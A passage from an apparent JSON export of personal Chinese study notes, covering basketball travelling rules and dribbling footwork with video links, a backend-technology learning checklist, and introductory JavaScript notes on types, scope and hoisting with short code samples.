foot）`。理解中枢脚的确立，是判断是否走步违例的关键。但在新规则中，尤其是在行进间，这个概念某种意义上被削弱了。\n\n中枢脚和另一个规则概念“旋转”是一个整体。这里一并给出：\n\n### 概念4 旋转和中枢脚\n> 25.1.2 在场上正持着一个活球的队员用一脚（称为：中枢脚）始终接触着该脚与地面接触的那个点，而另一只脚向任一方向踏出一次或多次的合法运动是旋转。[1]\n\n所以通俗的说，旋转就是拿着球以一个脚为支点转来转去，例如：\n![](https://gitee.com/NaisWang/images/raw/master/img/640-12.gif)\n![](https://gitee.com/NaisWang/images/raw/master/img/640-13.gif)\n\n下面这种动作显然不是旋转而是腾空，因为一脚没有始终接触地面作为支点。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-14.gif)\n\n而用来作为旋转的支点的那只脚，就是中枢脚。\n\n\n## 站立时合球后的走步判定原则\n站立情况下的带球走判定是最简单的，但同时这也是很多复杂判例的判定基础，因此建议认真理解其中的判定原则。\n\n### 情况2.1 旋转时中枢脚滑动\n前文提到，站立情况（Standing）就是双脚着地持球。此时你可以用任何一只脚作为中枢脚旋转。当你一只脚抬起的瞬间，另一只脚就成为中枢脚。中枢脚和旋转的概念在本文第一部分我们已经给出。\n然而要注意，在旋转时中枢脚不可以滑动，否则将是一次违例\n![](https://gitee.com/NaisWang/images/raw/master/img/640-12a.gif)\nNBA官方判例：旋转时中枢脚左脚发生滑动。\n\n甚至是轻微的脚尖-脚跟-脚尖的滑动，如果裁判要抓，你也没啥办法。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-13a.gif)\n过于严厉的判罚尺度：旋转时中枢脚左脚发生滑动。\n\n### 情况2.2 站立情况下开始运球\n现在我们知道，球员站立接球后可以一通旋转（当然不转也行），但是转完之后接下来呢？显然他有三种选择——传、投、运（如果之前还没有运过球的话）。注意带球走规则中传球和投篮这两种情况基本上是等同且可以相互替换的，那么实际上我们只需要讨论两种情况：1 开始运球 2 开始投篮/传球。我们首先来看运球。\n\n篮球规则规定，开始运球时，在球离手前中枢脚不得离开地面[1]。注意这里的判定标准是球离手，而不是球落地，也就是说只要球离开手你就可以随便起步，绝对不存在带球走的可能。\n\n如图，这个运球在球离手前，中枢脚没有离开地面，因此是合法的。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-14a.gif)\n\n而另一个差不多一模一样的动作，球离手前，中枢脚已经抬起，因此这是一次违例。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-15a.gif)\n\n注意这里的判定原则：是否带球走绝对不是和技术动作一一对应的。看起来一模一样的动作，做的规范和不规范，相对应的就可能是违例或不违例。所以裁判也好运动员也好，不要简单的建立“某个技术动作必然违例/不违例”之类的条件反射，而是应该具体判断这个动作有没有超出规则所述的限制——当然如果你临场实在看不过来想不明白，那也只能凭经验猜。\n\n开始运球还有几个容易误解的点：球员可以远远的将球往前抛，甚至直接向上抛扔过防守队员再去追球。只要球离手前中枢脚不离开地面。都是合法的[4]。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-16a.gif)\n\n然而下面这个动作，起跳时中枢脚已经离开地面，随后球员将球扔到地上并再次触球，形成一次运球，因此这是一次走步违例。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-17a.gif)\n\n### 情况2.3 站立情况下投篮/传球\n下面我们再来讨论第二种情况：开始投篮/传球。\n\n篮球规则规定，队员可以跳起（两只脚离开地面）传球或投篮，但在球离手前，任意一只脚不得落回地面[1]。记住了，<font color=\"red\">在站立情况下开始运球的时候，限制的是脚的抬起。而在投篮/传球的时候，限制的是脚的落下</font>。这个区别非常关键。\n\n因此你可以起跳腾空，投篮/传球，球出手后落地——比如一个跳投。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-18a.gif)\n\n但球离手前任意一只脚（不仅是中枢脚）都不得落回地面！下面这个很奇葩的动作显然是违例，因为跳起球(双脚离开地面)未出手，但有一只脚已经落回地面。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-22.gif)\n\n重点来了：FIBA规则主编Lubomir Kotleba指出，规则“队员可以跳起中枢脚传球或投篮”这句话里的“跳起（jump off）”和“抬起（lift）”意义完全相同。因此旋转后，抬起中枢脚，以非中枢脚为支点投篮/传球，球出手后落地，完全合法。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-23.gif)\n\n这里当然并不存在什么双脚必须同时起跳，你甚至还可以抬起中枢脚金鸡独立\n然而，做下面这个动作就不行了。\n![](https://gitee.com/NaisWang/images/raw/master/img/640-24.gif)\n如我们在第一部分提到的，这种飞起来跨步的动作并不是旋转而是腾空，和上面那个很奇葩的投篮是一回事——球离手前跳起，任意一只脚落回地面，这是违例。\n\n### 小结：\n站立情况下的走步判定一共就这些内容。我们总结如下：\n- 站立时可以旋转，但中枢脚不可以滑动。\n- 站立时开始运球，球离手前，中枢脚不能抬起。\n- 站立时传球或投篮，中枢脚可以抬起。但在球离手前，任意一脚都不得再次落回地面。\n- 旋转要有支点，跳起来传球或投篮不是旋转，任意一脚落回地面前球必须出手。\n\n\n## 行进间合球后的走步判定原则\n行进间脚步判断走步核心: **合球后**只能走2步。<font color=\"red\">注意：走步是发生在合球后的，即合球前是不存在走步的。</font>行进间合球时步数分两种情况：\n- 合球时只有一只脚在地上，此时，这只步为合球步，即为第0步\n- 合球时没有一只脚在地上，此时，没有合球步，也可以认为合球步在空中\n\n- 行进间012接球开始运球, 注：开始运球时，中枢脚抬起时，球要离手(参考情况2.2 站立情况下开始运球)\n- 行进间结束运球012上篮, 技巧: 想要合球时迈出的那个脚还可以再走一步，这一步也是最后一步\n\n行进间中确定中枢脚：\n- 合球后单脚先着地作为第一步，然后另一只脚着地，此时将先着地的脚作为中枢脚\n- 合球后单脚先着地作为第一步，然后单脚起跳，两只脚同时落地作为第二部，此时不可以使用任意一只脚作为中枢脚\n- 合球后双脚同手落地作为第一步，此时可以将任意一只脚作为中枢脚\n\n\n- 【详解1】https://video.zhihu.com/video/1238801150544842752?player=%7B%22autoplay%22%3Afalse%2C%22shouldShowPageFullScreenButton%22%3Atrue%7D\n- 【详解2】https://v.qq.com/iframe/player.html?width=500&height=375&auto=0&vid=e3164q4nsse\n- 【老马走步了么？青春结束？】 https://www.bilibili.com/video/BV1tt4y117Te\n- 【012步的判断，再来复习一下。】https://www.bilibili.com/video/BV1p54y1z7eD?spm_id_from=333.337.0.0\n- 【争吵终结者！三种常见的中枢脚判定方式】https://www.bilibili.com/video/BV1M341117vh?from=search&seid=9247219627972769961&spm_id_from=333.337.0.0\n\n# 过人技术之基础篇\n运球过人：要让我说的话，其实这是一个整体动作，也就是老一辈球员念叨的“人球要合一”。\n但如果按现下的美式教学方法，把所有技术动作按照特点都拆开细分的话，是可以按照运球动作和脚步动作两个方向来讲解的。\n就说最经典的Crossover吧，按运球来说，就是体前变向。但是按脚步来说，这里可能包含的技术有刺步、拖曳步、顺步、交叉步和坠步。\n因为运球过人是要配合脚步的，所谓“运球靠手，过人靠腿”。光运球好，脚步不灵，那就是“原地小陀螺”。球运的不好也不行，脚过去了，球甩防守人脸上了，这特么就瞬间尴尬了。\n所以，运球和脚步可以分开练习，但最后一定要结合。\n按上面说的，把运球和脚步分两块，然后再看看什么动作可以结合到一起。我尝试着画了一个图，看完之后我有些迷糊......\n\n## 基本术语\n- 外侧脚与外侧手：运球手为外侧手，运球手的同侧脚为外侧脚。他们的异侧则为内侧脚与内侧手\n- 推蹬脚\n![](https://gitee.com/NaisWang/images/raw/master/img/3.18.20.jpg)\n- 滑动脚（shift）\n![](https://gitee.com/NaisWang/images/raw/master/img/3.19.47.jpg)\n\n## 运球\n### 体前\n体前在快攻中运用时，优点是不减速，缺点是运球高。\n![](https://gitee.com/NaisWang/images/raw/master/img/11.10.36.gif)</br>\n体前在阵地战中运用时运球要低，重心也要低。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-0d51eaa2293a336756e2136c23005145_b.webp.gif)</br>\n\n### 胯下\n快攻的胯下需要一步过，不减速的。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-828fb75af58cec24c76d27b1547b281c_b.webp.gif)</br>\n阵地战的胯下就要用更低的运球方式\n![](https://gitee.com/NaisWang/images/raw/master/img/11.17.26.gif)</br>\n\n- 【《BalanceBreaker》胯下运球不流畅 总失误？6分钟快速提升你的胯下运球！第一期（基础篇）】https://www.bilibili.com/video/BV1D4411u7ZZ\n\n### 背后\n快攻通常采用绕腰的方式过人，还是那句话——不用减速。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-0ec38f9aed6430254aa83822bb47aa38_b.webp.gif)\n\n阵地战一般则用臀下的背后运球\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-ca6b9eabaca7069f4550cf62fef081f8_b.webp.gif)\n\n或者采用背粘滑步的方式过人，克劳福德、库里、欧文等人都很喜欢用这个动作。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-d973a5b5fd93a79bedf91bd3d7d8a585_b.webp-2.gif)\n\n- 【野蛮生长：背后运球总砸脚怎么办？五个动作让你成为背运高手！】https://www.bilibili.com/video/BV1sW411K7mc\n- 【不会背后运球？5个练习让你快速掌握！】https://www.bilibili.com/video/BV1PK4y1U7aG\n\n\n### 反手拉球\n通常结合剪刀步，这个动作被人们称之为Shamgod。\n![](https://gitee.com/NaisWang/images/raw/master/img/11.22.21.gif)</br>\n\n### 反胯下\n其实就是刺步+撤步的一个变体\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-32af2b0d5fa231bb0c01531b701a0030_b.webp.gif)</br>\n\n### In & out(单手提前变向/内外运球)\n这个真心不需要多介绍了，最实用的“手活”之一。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-d47d98292fa82d9d8e6c8c32eb2173e8_b.webp.gif)</br>\n阵地战小幅度in & out+顺步启动，经典的动作。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-dc814f7489e23f2df41ff38230f6ab8b_b.webp.gif)</br>\n\n- 【三分钟教你学会in&out过人！ 篮球场上最高效实用的过人动作！-哔哩哔哩】https://b23.tv/yQC3naR)\n\n### Pocket Dribble\n![](https://gitee.com/NaisWang/images/raw/master/img/4.01.11.gif)\n\n- 【火遍全网的口袋运球你练对了吗？】https://www.bilibili.com/video/BV1h5411x7Jy?from=search&seid=10345301719595295739&spm_id_from=333.337.0.0\n- 【口袋运球-哔哩哔哩】https://b23.tv/usZp0BU\n- 【3个训练迅速掌握口袋运球 Pocket Dribble 解锁你的运球潜能 高效提升控球能力！【宝石碎片 GemPieces Vol.66】-哔哩哔哩】https://b23.tv/h4Ag9fh\n- 【悬浮运球的一个关键细节】https://www.bilibili.com/video/BV1b5411b7Hi?from=search&seid=11432570782274699890&spm_id_from=333.337.0.0\n\n\n### Push ball\n- 【Push ball】https://www.youtube.com/watch?v=gZ5yUympRLQ\n\n## 脚步\n### 顺步与交叉步\n无论是交叉步还是顺步，都最好用运球步。判断是否为交叉步还是顺步，看突破的第一步，迈出第一步后双脚成交叉则为交叉步，反之为顺步\n\n### jab step(刺探步)\n除了持球有刺步，运球也可以做刺步的\n- 【JAB STEP】https://www.youtube.com/watch?v=evTjOa8kVwM\n- 【JAB STEP｜Toe Tap&Go】https://www.youtube.com/watch?v=EO1J-ViinPw\n- 【JAB STEP｜Shimmy&Go】https://www.youtube.com/watch?v=NcCmutgBRps\n\n### 后撤步\n遇到强力防守时很常见\n![](https://gitee.com/NaisWang/images/raw/master/img/12.00.20.gif)</br>\n\n### 误导步\n敏捷梯进进出出结合运球的基础步法\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-1d557927c0a4b922f4bd9dcd8cd9a9a4_b.webp.gif)\n\n### dribble step（运球步）\n- 【Dribble step】https://www.youtube.com/watch?v=x_4VAP7dOkA\n\n### Heavy step\n- 【Heavy Step】https://www.youtube.com/watch?v=Pv7dmTcuZgE\n\n### Hip swivel｜Hip Rotation｜Hip switch｜Foot Switch\n转髋技术是由内侧脚上的髋关节做主导来实现转髋，例如左手持球，则以右侧的髋关节做主导来实现转髋\n \n![](https://gitee.com/NaisWang/images/raw/master/img/20211126153207.png)\n\n向外转髋与向内转髋的不同之处：\n- 向外转髋是为了寻找一个新的切入方向\n- 向内转髋是为了造成一个佯攻方向\n\n- 【Hip swivel｜Hip Rotation｜Hip switch｜Foot Switch】https://www.youtube.com/watch?v=ADGIX2gGt40\n- 【一秒破防！最重要的突破细节——转髋（上）】 https://www.bilibili.com/video/BV1Z5411K75N?from=search&seid=1448168864931218810&spm_id_from=333.337.0.0\n- 【【KBT干货】突破过人先开胯？学会这2种转髋突破，让你成为球场宗师！】https://www.bilibili.com/video/BV1yK411W7de?from=search&seid=16223398477263620386&spm_id_from=333.337.0.0\n\n### Bounce out | Bounce off | Bound\nBounce out: 往后方/斜后方跳跃\nBounce off: 这是专门用于与防守者拉开双方空间，适用与横向移动，遇到横向移动较慢的防守者，用这招进攻就对了\nBound: 侧向横移衔接到drop的脚步\n- 【Bounce off/out｜Bound】https://www.youtube.com/watch?v=15djEBKqvGg\n- 【後衛必學的啟動腳步\"Bound\"】https://www.youtube.com/watch?v=gOJRPWnEOkw\n\n### turn pound\nturn pound是以in & out运球配合横向移动的动作\n- 【turn pound】https://sv-se.facebook.com/grizzlybasketballhk/videos/技巧教學-turn-pound技巧要點c-dribble後會轉為pocket-dribblec-dribble後眼睛應注視籃框輔助手擺出隨時準備收球投籃實戰運用/1113631752382186/\n\n### partial step\n- 【partial step】https://www.youtube.com/watch?v=QYgi9pfN6t0\n\n### drop(坠步)\ndrop表示你让脚处于前后分离状态，并且前脚为外侧脚\n一脚落地时间为区别的话，可以将实现drop的脚步节奏分为如下3种\n1. 两脚同时落地的分腿split脚步\n2. 踩后脚在动前脚的同时落地的one tow脚步\n3. 只把前脚踩出去的step脚步\n\n- 【籃球教學｜Drop｜墜步｜交叉步與順步】https://www.youtube.com/watch?v=9TntpjgKhYY&t=4s\n- 【The Drop】https://www.youtube.com/watch?v=ODZnvSHnvZM\n- 【Drop 分析】https://www.youtube.com/watch?v=VdOPFRHw27Y\n- 【Drop 细节】https://youtu.be/5B11nLqi1-c\n\n### Punch Drag\n- 【 NBA球員都在使用的急停跳投腳步「 Punch Drag 」】https://www.youtube.com/watch?v=lseGp3kP-bM\n\n### Over the Top Cross\n- 【Advanced Basketball Crossover Move: Over the Top Cross】https://www.youtube.com/watch?v=ezVCOgzPmg0\n\n# 过人技巧之进阶\n## 刺步+撤步\n哈登很喜欢这种方式\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-451eb77c4cb266d9caf0062180878564_b.webp.gif)\n\n## 撤步+转髋步\n杜兰特常用动作之一，目的是让身体正面迅速朝向篮筐，然后衔接投篮或者顺步/交叉步突破。\n![](https://gitee.com/NaisWang/images/raw/master/img/v2-3c7fe49263422221d741c3b38dab2660_b.webp.gif)\n\n## IT move\n- 【IT move】https://www.youtube.com/watch?v=F2OEEtveOmM\n\n## 慵懒胯下 \nhttps://www.bilibili.com/video/BV1mb411171v?p=1&t=0.5\n\n## cross jab\n- 【過人神技｜籃球教學｜Harrison ｜腳步訓練｜字母哥的愛｜Cross Jab】https://www.youtube.com/watch?v=a4jd0Uh2Xtg\n- 【野球场最高效的过人动作，有手就能学会——变向误导】https://www.bilibili.com/video/BV1pi4y1o7Bn\n\n## 横移步、拖拽步、后侧步\n横移步、拖拽步、后侧步共同点：移动方向的靠外面的脚先抬起来且先落地\n\n- 【运球横移步对变向很重要，多练这个动作提升你的变向能力！】https://www.bilibili.com/video/BV144411q7Fg?spm_id_from=333.999.0.0 \n- 【美式后卫训练，库里背运】https://www.bilibili.com/video/BV12E411B7qy\n- 【【KBT干货】杜兰特为什么最钟爱拖拽步？看完这个视频你会明白！】https://www.bilibili.com/video/BV1hE411a77K\n\n## 全转身、封阻转身、半转身、1/4转身\n- 【转身教学 1 全美最强篮球训练师系列Ryan Razooky】https://www.bilibili.com/video/BV1Bt4y197Jn/\n- 【转身教学 2 全美最强篮球训练师系列Ryan Razooky】https://www.bilibili.com/video/BV1xK411H7Vc/\n\n## 转身过人\n- 【听说你用排水渠过弯？转身过人大杀招，还不学？】https://www.bilibili.com/video/BV1fU4y1G7WS\n\n## 换手转身过人\n- 【换手转身过人】https://www.bilibili.com/video/BV1sh411y7UE?from=search&seid=10459355433340104929&spm_id_from=333.337.0.0\n\n## 假转身\n- 【一招超实用的变奏假转身!【泰勒·洛夫】篮球教学】https://www.bilibili.com/video/BV1hP4y1s7uS\n- 【跟老王学他的大招假转身】https://www.bilibili.com/video/BV1nq4y1k7Gp\n- 【假转身过人，兄弟萌，冲！】https://www.bilibili.com/video/BV1z4411X7YR\n\n## 三威胁试探步技巧\n- 【关于三威胁试探步的3个隐藏技巧！学会暴涨球技！】https://www.bilibili.com/video/BV1Ey4y1H7TR/\n- 【三威胁半转身突破】https://www.bilibili.com/video/BV1Lp4y1W7V7\n- 【三威胁交叉步突破】https://www.bilibili.com/video/BV1A5411J7WF/\n\n## 单手上篮空中合球\n- 【【偏方】为什么欧文钟爱“单手举球上篮”？】https://www.bilibili.com/video/BV1Ty4y1H7E7\n\n## 翻身跳投\n- 【学会这几点，让你打球犹如乔老爷子附体！】https://www.bilibili.com/video/BV1Q341167Nb\n- 【科比后仰跳投训练 我的篮球跳投启蒙视频】https://www.bilibili.com/video/BV1Da4y1v7jC\n- 【翻身跳投或后仰跳投的两个细节】https://www.bilibili.com/video/BV1nC4y1b73s\n- 【低位进攻不用怕，翻身跳投美如画！】https://www.bilibili.com/video/BV1nK4y1S7Wf\n\n\n\n# 上篮\n**面筐底下左右勾手上篮**\n伸直手\n![](https://gitee.com/NaisWang/images/raw/master/img/1.13.27.gif)\n\n**面筐底下左右反勾手上篮**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.16.02.gif)\n\n**筐背后左右勾手上篮**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.17.51.gif)\n\n**左右低手上篮（不运球)**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.20.22.gif)\n\n**左右高手上篮**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.24.47.gif)\n\n**左右并步上篮（012）**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.26.30.gif)\n\n**跳步上篮（两脚同时落地）**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.29.22.gif)\n\n**同侧脚上篮**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.31.20.gif)\n![](https://gitee.com/NaisWang/images/raw/master/img/1.36.02.gif)\n\n**上反篮**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.38.17.gif)\n![](https://gitee.com/NaisWang/images/raw/master/img/1.39.35.gif)\n\n**转身上篮(转到异侧)**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.42.11.gif)\n\n**转身上篮(转到同侧)**\n![](https://gitee.com/NaisWang/images/raw/master/img/1.43.49.gif)\n\n\n"
  },
  {
    "title": "./notes/基础知识/学习路线.md",
    "body": "spring √\nspringmvc √\nmybatis √\nspringboot √\nspringcloud\nsentinel\nmaven √\nredis √\ndocker\nelasticsearch \ndubbo\nzookeeper\nnginx √\nspringsecurity √\nactiveMQ\nrabbitMQ\nrocketMQ\njvm √\njuc\nmycat\nkubernetes\nshiro"
  },
  {
    "title": "./notes/基础知识/js.md",
    "body": "# 对象\njs中对象的分类：\n- 内建对象：由ES标准中定义的对象，在任何的ES的实现中都可以使用，比如：Math, String, Number, Boolean, Function, Object, ...\n- 宿主对象：由JS的运行环境提供的对象，目前来讲主要指浏览器提供的对象，比如：BOM, DOM\n- 自定义对象: 由开发人员自己创建的对象\n\n# 全局作用域\n在全局作用域中创建的变量都会作为window对象的属性保存\n在浏览器 JavaScript 中，通常window是全局对象， 而Node.js中的全局对象是global，所有全局变量（除了global本身以外）都是global对象的属性。\n在 Node.js 我们可以直接访问到global的属性，而不需要在应用中包含它。\n按照 ECMAScript 的定义，满足以下条件的变量是全局变量：\n- 在最外层定义的变量；(Node.js中开发者不可能在最外层定义变量，因为所有用户代码都是属于当前模块的， 而模块本身不是最外层上下文。)\n- 全局对象的属性；\n- 隐式定义的变量（未定义直接赋值的变量）。\n当你定义一个全局变量时，这个变量同时也会成为全局对象的属性，反之亦然\n\n```js\nvar num1 = 1\nfunction a(){\n  console.log(this.num1)\n}\na()\n\nnum2 = 2 \nfunction b(){\n  console.log(this.num2)\n}\nb()\n\nglobal.num3 = 3\nfunction c(){\n  console.log(this.num3)\n}\nc()\n```\n使用`node.js`运行这个js文件，结果如下：\n```\nundefined\n2\n3\n```\n\n# JS数据类型分类和判断\nJavaScript中有6种数据类型：数字（number）、字符串（string）、布尔值（boolean）、undefined、null、对象（Object）。其中对象类型包括：数组（Array）、函数（Function）、还有两个特殊的对象：正则（RegExp）和日期（Date）。\n\n## 分类\n从不同的角度对6种数据类型进行分类：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105958.png)\n\n## 判断\n### typeof\ntypeof返回一个表示数据类型的字符串，返回结果包括：number、string、boolean、object、undefined、function。typeof可以对基本类型number、string  、boolean、undefined做出准确的判断（null除外，typeof null===“object”，这是由于历史的原因，我就不巴拉巴拉了，其实我也说不清楚😢）；而对于引用类型，除了function之外返回的都是object。但当我们需要知道某个对象的具体类型时，typeof就显得有些力不从心了。\n```js\ntypeof 1; // number 有效\ntypeof ‘ ’;//string 有效\ntypeof true; //boolean 有效\ntypeof undefined; //undefined 有效\ntypeof null; //object 无效\ntypeof new Function(); // function 有效\ntypeof [] ; //object 无效\ntypeof new Date(); //object 无效\ntypeof new RegExp(); //object 无效\n```\n### instanceof\n当我们需要知道某个对象的具体类型时,可以用运算符 instanceof，instanceof操作符判断左操作数对象的原型链上是否有右边这个构造函数的prototype属性，也就是说指定对象是否是某个构造函数的实例，最后返回布尔值。 检测的我们用一段伪代码来模拟instanceof内部执行过程：\n```js\ninstanceof (A,B) = {\n    var L = A.__proto__;\n    var R = B.prototype;\n    if(L === R) {\n        //A的内部属性__proto__指向B的原型对象\n        return true;\n    }\n    return false;\n}\n```\n从上述过程可以看出，当 A 的`__proto__`指向 B 的 prototype 时，就认为A就是B的实例，我们再来看几个例子：\n```js\n[] instanceof Array; //true\n[] instanceof Object; //true\nnew Date() instanceof Date;//true\nnew Date() instanceof Object;//true\nfunction Person(){};\nnew Person() instanceof Person;//true\nnew Person() instanceof Object;//true\n```\n我们发现，虽然 instanceof 能够判断出 [] 是Array的实例，但它认为 [] 也是Object的实例，为什么呢？ 我们来分析一下[]、Array、Object 三者之间的关系: 从instanceof 能够判断出`[].__proto__`指向 Array.prototype， 而`Array.prototype.__proto__`又指向了Object.prototype，`Object.prototype.__proto__`指向了null,标志着原型链的结束。因此，[]、Array、Object就形成了如下图所示的一条原型链：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110044.png)\n\n从原型链可以看出，[] 的`__proto__`直接指向Array.prototype, 间接指向Object.prototype, 所以按照 instanceof 的判断规则，[] 就是Object的实例。\n注意:instanceof运算符只能用于对象，不适用原始类型的值。\n```js\n'hello' instanceof String // false\nnull instanceof Object // false\nundefined instanceof Object // false\n```\n字符串、null和undefined不是对象，所以返回false。\n\n### constructor\nconstructor属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。\n```js\nvar f = new F();\nf.constructor === F;// true\n```\n但是 constructor 属性易变，不可信赖，这个主要体现在自定义对象上，当开发者重写prototype后，原有的constructor会丢失。\n```js\nfunction F() {}\nF.prototype = {\n\t_name: 'Eric',\n};\nvar f = new F();\nf.constructor === F; // false\n```\n因此，为了规范，在重写对象原型时一般都需要重新给constructor赋值，以保证实例对象的类型不被改写。\n```js\nfunction F() {}\nF.prototype = {\n    constructor: F, \n   _name: 'Eric',\n};\nvar f = new F();\nf.constructor === F; // true \n```\n\n### Object.prototype.toString \ntoString是Object原型对象上的一个方法，该方法默认返回其调用者的具体类型，更严格的讲，是 toString运行时this指向的对象类型, 返回的类型格式为`[object,xxx]`,xxx是具体的数据类型，其中包括：String,Number,Boolean,Undefined,Null,Function,Date,Array,RegExp,Error,HTMLDocument,... 基本上所有对象的类型都可以通过这个方法获取到。\n```js\nObject.prototype.toString.call('') ;   // [object String]\nObject.prototype.toString.call(1) ;    // [object Number]\nObject.prototype.toString.call(true) ; // [object Boolean]\nObject.prototype.toString.call(undefined) ; // [object Undefined]\nObject.prototype.toString.call(null) ; // [object Null]\nObject.prototype.toString.call(new Function()) ; // [object Function]\nObject.prototype.toString.call(new Date()) ; // [object Date]\nObject.prototype.toString.call([]) ; // [object Array]\nObject.prototype.toString.call(new RegExp()) ; // [object RegExp]\nObject.prototype.toString.call(new Error()) ; // [object Error]\nObject.prototype.toString.call(document) ; // [object HTMLDocument]\nObject.prototype.toString.call(window) ; //[object Window]\n```\n需要注意的是，必须通过Object.prototype.toString.call来获取，而不能直接 new Date().toString(), 从原型链的角度讲，所有对象的原型链最终都指向了Object, 按照JS变量查找规则，其他对象应该也可以直接访问到Object的toString方法，而事实上，大部分的对象都实现了自身的toString方法，这样就可能会导致Object的toString被终止查找，因此要用call来强制执行Object的toString方法。\n\n### 总结：\n- typeof可以准确地判断出基本类型，但是对于引用类型除function之外返回的都是object；\n- 已知是引用类型的情况可以选用instanceof或constructor方法进行具体类型的判断：\n- instanceof是基于原型链的；\n- constructor 属性易变，不可信赖，为了规范，在重写对象原型时一般都需要重新给constructor赋值，以保证实例对象的类型不被改写；\n- Object.prototype.toString.call() 通用但很繁琐。感谢您花时间读到这里～\n\n# js判断字符串是否位数字\n\"23\" 这样的字符串是可以转换成数字类型的，但如何判断它可以转换呢？\n**以下是不正确的用法：**\n```js\nvar str = \"37\";\nif (typeof(str) == \"number\")\n{\n    alert(\"是数字\");\n}\n37 虽然可以转化成数字，但这里它毕竟是字符串类型，所以此法不正确。\n```\n```js\nvar str = \"37\";\nvar n = parseInt(str);\nif (!isNaN(n))\n{\n    alert(\"是数字\");\n}\n```\nparseInt 会将字符串转化成整数，但它会忽略非数字部分而不给任何提示，比如：\"37ABC\" 会转化成 37，所以此法不正确。\n\n**以下是正确的用法：**\n```js\nvar str = \"37\";\nvar n = Number(str);\nif (!isNaN(n))\n{\n    alert(\"是数字\");\n}\n```\n注意：在 JavaScript 中，对于省略写法（如：\".3\"、\"-.3\"）、科学计数法（如：\"3e7\"、\"3e-7\"）、十六进制数（如：\"0xFF\"、\"0x3e7\"）均被认定为数字格式，这类字符串都可以用 Number 转化成数字。\n\nisNaN 返回一个 Boolean 值，指明提供的值是否是 NaN ，NaN 的意思是 not a number（不是一个数字）。\n语法：isNaN(numValue)\n\n## js变量前的+是什么意思\nif (+value >= distance) {\n这个+什么意思\n可以理解为 `Number(value)`, 会将其按照Number函数的规则转换为数值或者NaN,规则大概如下：\n- Boolean:true返回1，false返回0\n- 数据值，直接返回\n- null，返回0\n- undefined，返回NaN\n- 对于字符串，将其转换为十进制数值，会忽略前面的0（16进制除外），空字符串返回0，浮点数会返回浮点数值。其他格式字符串（无论是否数字开头，返回NaN，字符串中好几个小数点，返回NaN）\n\n# 变量与函数的声明提前\n使用var关键字声明的变量（在方法中也是如此），会在所有的代码执行之前被声明(**但不会赋值**)，但如果声明变量时不使用var关键字，则变量不会被声明提前\n```js\nconsole.log(a); // 输出: undefined\nvar a = 1;\n\nconsole.log(b); //报错：b is not defined\nb = 1;\n\nfunction test(){\n  console.log(a);\n  var a = 1;\n}\ntest(); // 输出：undefined\n\nfunction test(){\n  console.log(a);\n  a = 1;\n}\ntest(); // 报错：b is not defined\n```\n\n使用函数声明形式创建的函数function 函数(){}, 他会在所有的代码执行前就被创建，所以我们可以在函数声明前来调用函数，但如果是使用函数表达式的方式创建的函数，则函数不会被声明提前\n```js\ntest() // 输出：1\nfunction test(){\n  console.log(\"1\");\n}\n\ntest1() // 报错：undefined is not a function\nvar test1 = function(){\n  console.log(\"1\");\n}\n```\n\n# let、const、var的区别\n- 使用var声明的变量，其作用域为该语句所在的**函数内**，且存在变量声明提前。值可更改\n- 使用let声明的变量，其作用域为该语句所在的**代码块内**，不存在变量声明提前。值可更改\n- 使用const声明的常量，其作用域为该语句所在的**代码块内**，不存在变量声明提前。值不可更改\n\n# 属性语法\n- 添加/修改属性： `对象名.属性名 = 属性值`\n- 删除属性： `delect 对象名.属性名`\n\njs添加/访问属性有两种方式，一种是通过`.`来访问/添加属性，另一种是通过`[]`来访问/添加属性\n`[ ]`更为灵活，可以写表达式，而`.`只能进行硬编码.\n```js\nobj.nihao = \"nihao\";\n\nvar n = \"123\"\nobj[n] = 111;\n```\n\n# in运算符， hasOwnProperty(属性名)\n通过in运算符可以检查一个`对象`或`该对象的原型对象`中是否含有指定的属性\n```js\n//检查obj中是否含有test属性\nconsole.log(\"test\" in obj)\n```\n通过hasOwnProperty(属性名)可以检查一个`对象`中是否含有指定的属性，不包括该对象的原型对象\n\n# 函数\n```js\n//第一种\nvar fun = new Function(\"console.log(\"hello\")\");\nfun();\n\n//第二种\nfunction fun1(){\n  console.log(\"hello\");\n}\nfun1();\n\n//第三种\nvar fun2 = function(){\n  console.log(\"hello\");\n}\nfun2();\n```\n\n<font color=\"red\">js中函数是对象</font>\n这是与java的一个非常不同的地方\n在js中函数是一个对象，它可以当作参数传入一个函数中。 而java中函数是不能作为一个对象存在的，更不可能当作参数传入一个方法中\n\n```js\nfunction test(a){\n  a();\n}\nfunction test2(){\n  console.log(\"whz\");\n}\ntest(test2)//输出：whz\n```\n\n## 默认参数值\nJavaScript 中函数的参数默认是undefined。然而，在某些情况下可能需要设置一个不同的默认值。这是默认参数可以帮助的地方。\n\n以前，一般设置默认参数的方法是在函数体测试参数是否为undefined，如果是的话就设置为默认的值。\n\n下面的例子中，如果在调用multiply时，参数b的值没有提供，那么它的值就为undefined。如果直接执行a * b，函数会返回 NaN。\n```js\nfunction 